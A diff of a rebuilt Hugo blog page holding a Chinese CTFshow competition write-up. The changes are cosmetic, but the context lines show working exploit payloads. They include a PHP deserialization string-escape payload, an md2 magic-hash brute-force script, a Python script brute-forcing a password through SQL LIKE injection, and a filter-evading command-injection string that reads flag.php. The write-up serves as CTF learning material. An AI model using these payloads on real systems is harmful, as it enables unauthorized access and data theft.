@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>CTFshow-月饼杯 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -289,7 +289,7 @@
 <h2 id="解题过程"><a href="#解题过程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:解题过程" class="headings">解题过程</a></h2>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -326,7 +326,7 @@
 </span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 
 <span class="k">class</span> <span class="nc">a</span>
@@ -367,20 +367,20 @@
 <p> ​ ​ ​ ​ ​ 此时，我们的序列化字符串为：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;a&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;uname&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;password&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;yu22x&#34;</span><span class="p">;}</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;i:1;}
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;a&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;uname&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;password&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;yu22x&#34;</span><span class="p">;}</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;i:1;}
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p> ​ ​ ​ ​ ​ payload大致结构已经没什么问题，但是uname值的属性<code>s:30:&quot;&quot;;</code>会让uname在反序列化时取30长度的字符，而我们的输入根本不会在代码执行后改变字符长度。这时候就需要函数<code>Filter</code>，Filter的作用是将Firebasky替换为Firebaskyup，替换后会多出两个字符，在反序列化时我们就能''逃出''两个字符，通过15个Firebasky就可以让30个字符<code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;}</code>全部逃出。</p>
 <p>payload</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;s:5:&#34;</span><span class="nx">yu22x</span><span class="s2">&#34;;}
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;s:5:&#34;</span><span class="nx">yu22x</span><span class="s2">&#34;;}
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p>比赛时就做出这道题了，之后全在划水。(菜哭了...)</p>
@@ -391,7 +391,7 @@
 <h2 id="解题过程-1"><a href="#解题过程-1" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:解题过程-1" class="headings">解题过程</a></h2>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -421,7 +421,7 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 <span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
@@ -472,14 +472,14 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p> ​ ​ ​ ​ ​ 在<code>==(弱等于)</code>的情况下，<strong>字符串与数字的比较会转化为数字与数字的比较</strong>，而php对<code>0e...</code>结构的字符串与数字比较时会统一解释为<code>数字0</code>。</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
 </span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e123&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
 </span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="s1">&#39;0e123&#39;</span><span class="p">);</span> <span class="c1">// false；这是字符串与字符串的比较，并不满足转换规则
 </span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mf">0e123</span><span class="p">);</span> <span class="c1">// true；这是字符串与数字的比较，满足转换规则
@@ -492,7 +492,7 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>贴一下大佬脚本：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -509,7 +509,7 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">99999</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
     <span class="nv">$x1</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="s1">&#39;0e&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;024452&#39;</span><span class="p">);</span>
     <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$x1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">===</span><span class="s1">&#39;0e&#39;</span>  <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$x1</span><span class="p">)){</span>
@@ -539,11 +539,11 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>通过了前两关会给出hint.php源码内容：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
 <span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;flag in /fl0g.txt&#34;</span><span class="p">;</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -551,10 +551,10 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>先随便POST个<code>http://ctfshow.com</code>，回显</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="nx">scheme</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">http</span> <span class="p">[</span><span class="nx">host</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctfshow</span><span class="o">.</span><span class="nx">com</span> <span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="nx">scheme</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">http</span> <span class="p">[</span><span class="nx">host</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctfshow</span><span class="o">.</span><span class="nx">com</span> <span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>host名应该满足<code>preg_match('/ctfshow\.com$/',$host['host'])</code>的条件，但是没有回显<code>'差点点就成功了！'</code>，我也不清楚是什么原因，暂且叫做玄学吧。</p>
@@ -574,11 +574,11 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>F12看源码发现SQL语句</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- username yu22x --&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- username yu22x --&gt;</span>
 <span class="c">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -606,7 +606,7 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>接下来就是爆破密码，脚本:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -629,13 +629,13 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
 <span class="kn">import</span> <span class="nn">string</span>
 
 <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://83fea8dc-883c-49f1-9991-a1291ef09b08.chall.ctf.show/login.php&#39;</span>
 <span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
 <span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
     <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
         <span class="n">payload</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
@@ -646,7 +646,7 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
         <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
         <span class="k">if</span> <span class="s1">&#39;wrong&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
             <span class="n">passwd</span> <span class="o">+=</span> <span class="n">i</span>
-            <span class="k">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
             <span class="k">break</span>
     <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">):</span>
         <span class="k">break</span>
@@ -710,10 +710,10 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <p>最后读取flag.php：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1<span class="p">;</span><span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span> ????.??? <span class="c1"># nl flag.php</span>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1<span class="p">;</span><span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span> ????.??? <span class="c1"># nl flag.php</span>
 </code></pre></td></tr></table></div>
 </div>
 </div>
